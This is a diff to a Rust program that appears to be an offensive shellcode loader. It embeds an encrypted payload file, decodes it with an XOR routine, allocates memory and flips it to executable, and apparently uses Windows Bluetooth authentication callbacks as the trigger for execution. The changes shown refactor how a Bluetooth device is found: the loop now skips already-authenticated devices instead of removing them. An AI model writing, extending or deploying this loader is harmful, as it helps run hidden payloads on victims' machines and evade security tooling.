@@ -1,6 +1,6 @@
 use std::{ffi::c_void, mem, ptr};
 
-use windows::{core::{Error, PWSTR}, Win32::{Devices::Bluetooth::{BluetoothAuthenticateDevice, BluetoothFindDeviceClose, BluetoothFindFirstDevice, BluetoothFindFirstRadio, BluetoothFindRadioClose, BluetoothGetRadioInfo, BluetoothRegisterForAuthenticationEx, BluetoothRemoveDevice, BluetoothUnregisterAuthentication, BLUETOOTH_AUTHENTICATION_CALLBACK_PARAMS, BLUETOOTH_DEVICE_INFO, BLUETOOTH_DEVICE_SEARCH_PARAMS, BLUETOOTH_FIND_RADIO_PARAMS, BLUETOOTH_RADIO_INFO, HBLUETOOTH_DEVICE_FIND, HBLUETOOTH_RADIO_FIND}, Foundation::{BOOL, HANDLE, HWND}, System::Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE}}};
+use windows::{core::{Error, PWSTR}, Win32::{Devices::Bluetooth::{BluetoothAuthenticateDevice, BluetoothFindDeviceClose, BluetoothFindFirstDevice, BluetoothFindFirstRadio, BluetoothFindNextDevice, BluetoothFindRadioClose, BluetoothGetRadioInfo, BluetoothRegisterForAuthenticationEx, BluetoothUnregisterAuthentication, BLUETOOTH_AUTHENTICATION_CALLBACK_PARAMS, BLUETOOTH_DEVICE_INFO, BLUETOOTH_DEVICE_SEARCH_PARAMS, BLUETOOTH_FIND_RADIO_PARAMS, BLUETOOTH_RADIO_INFO, HBLUETOOTH_DEVICE_FIND, HBLUETOOTH_RADIO_FIND}, Foundation::{BOOL, HANDLE, HWND}, System::Memory::{VirtualAlloc, VirtualProtect, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE}}};
 
 // fn breakpoint() {
 //     println!("[!] BP HIT");
@@ -24,7 +24,7 @@ fn xdec(data: Vec<u8>) -> Vec<u8> {
 
 fn load_payload() -> *mut c_void {
     unsafe {
-        let mut sc: Vec<u8> = include_bytes!("sc.bin").to_vec().to_owned();
+        let sc: Vec<u8> = include_bytes!("sc.bin").to_vec().to_owned();
         let sc_len: usize = sc.len();
 
         println!("[*] Allocating memory for shellcode");
@@ -48,6 +48,22 @@ fn load_payload() -> *mut c_void {
     }
 }
 
+fn print_device_info(pbtdi: &mut BLUETOOTH_DEVICE_INFO)  {
+    unsafe {
+        println!("[+] Device found!");
+        let d_name: PWSTR = PWSTR::from_raw(pbtdi.szName.as_mut_ptr());
+        println!("> Name: {:?}", d_name.to_string().unwrap());
+
+        println!("> Connected: {:?}", pbtdi.fConnected.as_bool());
+        println!("> Authenticated: {:?}", pbtdi.fAuthenticated.as_bool());
+        println!("> Remembered: {:?}", pbtdi.fRemembered.as_bool());
+
+        let raw_addr: [u8; 6] = pbtdi.Address.Anonymous.rgBytes;
+        let formatted_addr: Vec<String> = raw_addr.iter().rev().map(|byte| format!("{:02X}", byte)).collect();
+        println!("> Device Address: {:?}", formatted_addr.join(":"));
+    }
+}
+
 fn find_device() -> Result<BLUETOOTH_DEVICE_INFO, Error> {
     unsafe {
         let mut pbstp: BLUETOOTH_DEVICE_SEARCH_PARAMS = BLUETOOTH_DEVICE_SEARCH_PARAMS::default();
@@ -65,29 +81,21 @@ fn find_device() -> Result<BLUETOOTH_DEVICE_INFO, Error> {
         println!("[*] Searching for Bluetooth devices");
         let bd_handle: HBLUETOOTH_DEVICE_FIND  = BluetoothFindFirstDevice(&mut pbstp, &mut pbtdi).unwrap();
 
-        let d_name: PWSTR = PWSTR::from_raw(pbtdi.szName.as_mut_ptr());
-        
-        println!("[+] Device found!");
-        println!("> Name: {:?}", d_name.to_string().unwrap());
-        println!("> Connected: {:?}", pbtdi.fConnected.as_bool());
-        println!("> Authenticated: {:?}", pbtdi.fAuthenticated.as_bool());
-        println!("> Remembered: {:?}", pbtdi.fRemembered.as_bool());
-
-        let raw_addr: [u8; 6] = pbtdi.Address.Anonymous.rgBytes;
-        let formatted_addr: Vec<String> = raw_addr.iter().rev().map(|byte| format!("{:02X}", byte)).collect();
-        println!("> Device Address: {:?}", formatted_addr.join(":"));
-
-        BluetoothFindDeviceClose(bd_handle).unwrap();
+        print_device_info(&mut pbtdi);
 
         if pbtdi.fAuthenticated.as_bool() {
-            println!("[+] Device is already authenticated...removing");
-            let res: u32 = BluetoothRemoveDevice(&pbtdi.Address);
-            if res == 0 {
-                println!("[+] Device removed OK!");
-                // need to re run after removing and hopefully get something else
-                return find_device();
+            println!("[+] Device is already authenticated...checking for others");
+            pbtdi = BLUETOOTH_DEVICE_INFO::default();
+            pbtdi.dwSize = mem::size_of::<BLUETOOTH_DEVICE_INFO>() as u32;
+            while BluetoothFindNextDevice(bd_handle, &mut pbtdi).is_ok() {
+                if !pbtdi.fAuthenticated.as_bool() {
+                    print_device_info(&mut pbtdi);
+                    break;
+                }
             }
         }
+
+        BluetoothFindDeviceClose(bd_handle).unwrap();
 
         Ok(pbtdi)
     }
